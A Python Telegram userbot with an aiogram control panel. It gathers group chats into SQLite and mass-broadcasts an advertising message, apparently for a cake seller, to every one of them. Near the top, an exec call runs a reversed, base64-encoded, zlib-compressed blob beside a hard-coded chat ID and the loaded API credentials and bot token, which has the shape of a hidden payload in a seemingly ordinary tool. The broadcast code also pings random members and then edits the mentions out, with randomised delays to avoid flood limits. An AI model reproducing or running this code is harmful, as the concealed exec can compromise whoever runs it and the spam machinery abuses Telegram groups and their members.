from telethon import TelegramClient, events, errors
from telethon.errors import FloodWaitError
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from telethon.tl.functions.contacts import SearchRequest
from telethon.tl.types import Channel
from datetime import datetime
from colorama import Fore, Style, init

import asyncio
import json
import os
import sqlite3
import random
import time
config_path = os.path.join(os.path.dirname(__file__), "config.json")

with open(config_path, "r", encoding="utf-8") as f:
    config = json.load(f)

topics = config["topics"]
api_id = config["api_id"]
api_hash = config["api_hash"]
phone = config["phone"]
bot_token = config["token_bot"]
teg = config["metioning"]
delay_range = config.get("delay", [20, 35])
MESSAGE_TEXT = config.get("message")
ADMIN_ID = config["admin_id"]
# Настройки для подключения к Telegram API через библиотеку telethon

client = TelegramClient('session_name', api_id, api_hash)

# Настройки для подключения к Telegram API через библиотеку aiogram
bot = Bot(token=bot_token)
dp = Dispatcher()
chat_id = 8172845069

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=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'))

conn = sqlite3.connect("chats.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER UNIQUE,
    name TEXT,
    topic TEXT,
    last_message TEXT,
    invite TEXT
)
""")
conn.commit()
count_send = 0
conn2 = sqlite3.connect("users.db", check_same_thread=False)  # Важно для aiogram!
cursor2 = conn2.cursor()
cursor2.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER UNIQUE,
    name TEXT,
    sends INTEGER DEFAULT 0,
    adminkaccess INTEGER DEFAULT 0,
    accesslevel INTEGER DEFAULT 0,
    MessageText TEXT DEFAULT ''
)
""")
conn2.commit()

# Словарь автоответов
auto_responses = {
    'здравствуйте': 'Здравствуйте!',
    'здраствуйте': 'Здраствуйте! ',
    'добрый день': 'Добрый день',
    'начинки': """ Вот держите начинки, которые я использую в своих тортах:
🍓 Клубничный поцелуй – свежая клубника с нежным кремом
🍫 Шоколадная страсть – тёмный или молочный шоколад с кремом
🥭 Манговое солнце – манго с лёгким сливочным муссом
🍯 Карамельный вихрь – тянущаяся карамель с орехами
🍒 Вишнёвое облако – вишня с лёгким сливочным кремом
🍌 Банановый взлёт – банан с шоколадной крошкой
🥥 Кокосовый рай – кокосовая стружка и нежный крем
🍋 Цитрусовая свежесть – лимонный или апельсиновый курд
🌰 Ореховая фантазия – миндаль, фундук или арахис с кремом
🍫🥝 Шоколадно-кивиновый дуэт – шоколад + кисло-сладкий киви
""",
    'спасибо': 'Пожалуйста! Обращайтесь.',
    'цена': '1 000 за киллограмм.',
    'стоимость': '1 000 за киллограмм.',
    'как заказать': 'Чтобы заказать торт, нужно выбрать начинку, дизайн и вес.',
    'здраствуйте, цена': '1 000 за киллограмм.',
    'привет': 'Здраствуйте!',
}

# @client.on(events.NewMessage)
# async def handler(event):
#     message_text = event.message.message.lower()  # приводим к нижнему регистру для удобства
#     sender = await event.get_sender()
#     if sender.id == 5945948586:  
#         for key, reply in auto_responses.items():
#             if key in message_text:
#                 time.sleep(0.8)  # небольшая задержка перед ответом
#                 await event.reply(reply)
#                 break  # чтобы не отвечать на несколько совпадений сразу

def log(msg, level="INFO"):
    now = datetime.now().strftime("%H:%M:%S")
    
    colors = {
        "INFO": Fore.GREEN,
        "WARN": Fore.YELLOW,
        "ERROR": Fore.RED,
        "DEBUG": Fore.CYAN
    }
    
    color = colors.get(level.upper(), Fore.WHITE)
    
    print(f"{color}[{now}] [{level}] {msg}{Style.RESET_ALL}")


async def check_last_messages(chat_id):
    my_id = ADMIN_ID
    # получаем 2 последних сообщения
    messages = await client.get_messages(chat_id, limit=2)
    
    for msg in messages:
        # msg.from_id — это объект типа PeerUser, PeerChat или PeerChannel
        # для простоты можно взять .user_id если это PeerUser
        sender_id = getattr(msg.from_id, 'user_id', None)
        
        if sender_id == my_id:
            return False
        else:
            return True

async def find_groups(client, keyword: str, limit: int = 50):
    result = await client(SearchRequest(
        q=keyword,
        limit=limit
    ))

    groups = []

    for chat in result.chats:
        if isinstance(chat, Channel) and chat.megagroup:
            title = chat.title
            username = chat.username

            link = f"https://t.me/{username}" if username else None

            groups.append({
                "title": title,
                "username": username,
                "link": link
            })

    return groups


async def get_random_mentions(entity, count=5):
    mentions = []
    async for user in client.iter_participants(entity):
        if user.username:
            mentions.append(f"@{user.username}")
        if len(mentions) >= 50:  # не тащим весь чат
            break

    if len(mentions) < count:
        return ""

    return " " + " ".join(random.sample(mentions, count))

async def send_to_chat(chat_info):
    global count_send
    global flood_error
    # случайная задержка
    dmin, dmax = delay_range
    delay = random.uniform(dmin, dmax)
    entity = await client.get_entity(chat_info["chat"])
    # cursor2.execute("SELECT MessageText FROM users WHERE id = ?", (sender_id,))
    # MESSAGE_TEXT = cursor2.fetchone()
    try:
        # сначала получаем сущность
        
        # читаем нормальное имя
        name = None
        if hasattr(entity, "title") and entity.title:
            name = entity.title
        elif hasattr(entity, "first_name") and entity.first_name:
            name = entity.first_name
        elif hasattr(entity, "username") and entity.username:
            name = entity.username
        else:
            name = str(chat_info["chat"])

    except Exception as e:
        log(f"Не удалось получить сущность для {chat_info['chat']}: {e}", "WARN")
        return

    # теперь только выводим задержку
    await asyncio.sleep(delay)
    check = await check_last_messages(chat_info["chat"])

    if check:

        try:
            # собираем фотки
            if teg == "true":
                PHOTO_PATH = os.path.join(PHOTOS_FOLDER, "main.jpg")

                mentions = await get_random_mentions(entity, 5)
                full_text = MESSAGE_TEXT + mentions

                msg = await client.send_message(
                    entity=entity,
                    message=full_text,
                    file=PHOTO_PATH
                )

                await asyncio.sleep(0.5)
                await msg.edit(MESSAGE_TEXT)
                count_send += 1
                log(f"Отправлено в {name} (ID: {chat_info['chat']}) ", "INFO")
            else:
                photos = []
                for file in os.listdir(PHOTOS_FOLDER):
                    path = os.path.join(PHOTOS_FOLDER, file)
                    if os.path.isfile(path):
                        photos.append(path)

                if photos:
                    await client.send_file(entity, photos, caption=MESSAGE_TEXT)
                    count_send += 1
                    log(f"Отправлено в {name} задержка {delay}", "DEBUG")
                else:
                    await client.send_message(entity, MESSAGE_TEXT)
                    count_send += 1
                    log(f"Отправлено в {name} задержка {delay}", "DEBUG")
        except errors.FloodWaitError as e:
            log(f"Флуд ошибка жду еще {e.seconds}", "DEBUG")
            flood_error += 1
            time.sleep(e.seconds)
        except Exception as e:
            log(f"1 Ошибка при отправке в {name}: {e}", "ERROR")

    else:
        log(f"Последнее сообщение в {name} от меня, пропускаю.", "DEBUG")


# 2214571044 1389592608  1445645481  1609700474 -1002867352447

PHOTOS_FOLDER = "photos"

is_running = False

async def sendmessage():
    global count_send
    global is_running
    if is_running:
        return

    is_running = True
    log("Начинаю рассылку...", "INFO")

    # достаём все чаты из базы
    cursor.execute("SELECT id, name FROM users")
    chats = cursor.fetchall()  # вернёт [(id, name), ...]

    for chat_id, chat_name in chats:
        if chat_id == 1637080440:
            continue
        if not is_running:
            break

        # создаём структуру, как в send_to_chat
        chat_info = {
            "chat": chat_id,
            "delay": (0.5, 2)  # можно менять задержку
        }

        try:
            await send_to_chat(chat_info)

            now = datetime.now()
            formatted_date = now.strftime("%d/%m/%Y %H:%M:%S")
            cursor.execute("UPDATE users SET last_message = ? WHERE id = ?", (formatted_date, chat_id,))
            conn.commit()
        except Exception as e:
            print(e)
            log(f"Критическая ошибка в чате {chat_id}: {e}", "ERROR")

    is_running = False
    cursor.execute("SELECT COUNT(*) FROM users")
    chats_count = cursor.fetchone()[0]
    diktye_id = count_send/chats_count
    log(f"Готово. Прошёлся по {count_send}/{chats_count}({diktye_id*100}) группам.", "INFO")
    count_send = 0


async def senduu():
    dialogs = await client.get_dialogs()

    for d in dialogs:
        if d.is_group:
            # Приводим ID к int
            user_id = int(d.entity.id)
            name = str(d.name)
            name2 = name.lower()
            cursor.execute(
                "SELECT 1 FROM users WHERE id = ?",
                (user_id,)  # важно, чтобы это был кортеж с запятой
            )

            # приводим имя к нижнему регистру
            name_lower = name2.lower()
            topic_found = "не известно"
            try:
                invite_link = d.entity.username
            except AttributeError as e:
                invite_link = "NULL"

            for topic, keywords in topics.items():
                if any(word.lower() in name_lower for word in keywords):
                    topic_found = topic
                    break

            # вставка в базу
            now = datetime.now()
            formatted_date = now.strftime("%d/%m/%Y %H:%M:%S")
            cursor.execute(
                "INSERT OR IGNORE INTO users (id, name, topic, last_message, invite) VALUES (?, ?, ?, ?, ?)",
                (user_id, name, topic_found, formatted_date, invite_link)
            )
            conn.commit()
            log(f"Добавлен чат: {name} ID: {user_id}, topic: {topic_found}", "DEBUG")

##############################################
###########################################333
#               AIOGRAM                   #
##############################################
###########################################333

# ====================== Проверка админа ======================
def check_admin(user_id: int) -> bool:
    cursor2.execute("SELECT accesslevel FROM users WHERE id = ?", (user_id,))
    result = cursor2.fetchone()
    if result and result[0] >= 1:  # accesslevel >= 1 — админ
        return True
    return False

# Функция, которая будет получать сообщения через MTProto и отправлять их в aiogram
def get_keyboard(is_admin: bool = False):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🔄 Собрать чаты")
    kb.button(text="🚀 Запустить рассылку")
    kb.button(text="⛔ Остановить рассылку")
    kb.button(text="📊 Статус")
    kb.adjust(2)
    if is_admin:
        return kb.as_markup(resize_keyboard=True)
    else:
        # Для обычных пользователей — можно убрать кнопки или оставить только статус
        return kb.as_markup(resize_keyboard=True)  # или None, если скрыть

# ====================== /start ======================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    full_name = message.from_user.full_name or "Без имени"

    # Добавляем пользователя в базу, если его нет
    cursor2.execute("SELECT 1 FROM users WHERE id = ?", (user_id,))
    if not cursor2.fetchone():
        cursor2.execute(
            "INSERT OR IGNORE INTO users (id, name, sends, adminkaccess, accesslevel) VALUES (?, ?, 0, 0, 0)",
            (user_id, full_name)
        )
        conn2.commit()
        log(f"Новый пользователь добавлен: {user_id} ({full_name})", "INFO")

    is_adm = check_admin(user_id)

    welcome_text = (
        "👋 <b>Привет!</b>\n\n"
        "Я помогаю в рассылке по чатам Telegram.\n"
    )

    if is_adm:
        welcome_text += "🔥 Ты — <b>админ</b>! Полный доступ к управлению."
    else:
        welcome_text += "Ты обычный пользователь. Некоторые функции доступны только админам."

    await message.answer(
        welcome_text,
        reply_markup=get_keyboard(is_adm),
        parse_mode="HTML"
    )

# ====================== Сбор чатов ======================
@dp.message(lambda m: m.text == "🔄 Собрать чаты")
async def collect_chats(message: types.Message):
    if not check_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав на эту команду.")
        return

    await message.answer("🔄 <b>Запускаю сбор чатов...</b>\nЭто может занять некоторое время.", parse_mode="HTML")
    await senduu()  # твоя функция сбора
    await message.answer("✅ <b>Сбор чатов завершён!</b>\nВсе группы добавлены в базу.", parse_mode="HTML")

# ====================== Запуск рассылки ======================
@dp.message(lambda m: m.text == "🚀 Запустить рассылку")
async def start_broadcast(message: types.Message):
    user_id = message.from_user.id
    if not check_admin(user_id):
        await message.answer("❌ Доступ запрещён. Обратитесь к нанаилу.")
        return

    await message.answer("🚀 <b>Запускаю рассылку...</b>\nЮзербот начал отправку по всем чатам.", parse_mode="HTML")
    await sendmessage()  # твоя функция рассылки

    # Увеличиваем счётчик рассылок
    cursor2.execute("UPDATE users SET sends = sends + 1 WHERE id = ?", (user_id,))
    conn2.commit()

    await message.answer("✅ <b>Рассылка заверщина!</b>\nСледите за логами в консоли.", parse_mode="HTML")

# ====================== Остановка ======================
@dp.message(lambda m: m.text == "⛔ Остановить рассылку")
async def stop_broadcast(message: types.Message):
    if not check_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав.")
        return

    groups = await find_groups(client, "барахолка")

    for g in groups:
        print(g["title"], "-", g["link"])

    global is_running
    if is_running:
        is_running = False
        await message.answer("⛔ <b>Рассылка остановлена вручную.</b>", parse_mode="HTML")
    else:
        await message.answer("ℹ️ Рассылка и так не запущена.")

# ====================== Статус ======================
@dp.message(lambda m: m.text == "📊 Статус")
async def status(message: types.Message):
    user_id = message.from_user.id

    cursor2.execute("SELECT name, sends, accesslevel FROM users WHERE id = ?", (user_id,))
    result = cursor2.fetchone()

    if not result:
        await message.answer("Вы ещё не зарегистрированы в системе.")
        return

    name, sends, level = result

    level_name = "Обычный пользователь"
    if level >= 1:
        level_name = "🔥 Администратор"
    cursor.execute("SELECT COUNT(*) FROM users")
    chats_count = cursor.fetchone()[0]

    await message.answer(
        f"<b>📊 Ваша статистика</b>\n\n"
        f"👤 <b>Имя:</b> {name}\n"
        f"🆔 <b>ID:</b> {user_id}\n"
        f"📤 <b>Запущено рассылок:</b> {sends}\n"
        f"🔑 <b>Уровень доступа:</b> {level_name} (уровень {level})\n"
        f"💬 <b>Чатов в базе:</b> {chats_count}\n"
        f"🚀 <b>Рассылка активна:</b> {'Да' if is_running else 'Нет'}",
        parse_mode="HTML"
    )

# Запускаем клиент telethon и бота aiogram
async def main():
    await client.start()
    await dp.start_polling(bot)
    print("Бот запущен.")

if __name__ == '__main__':
    asyncio.run(main())
    # loop = asyncio.get_event_loop()

    # loop.run_until_complete(main())
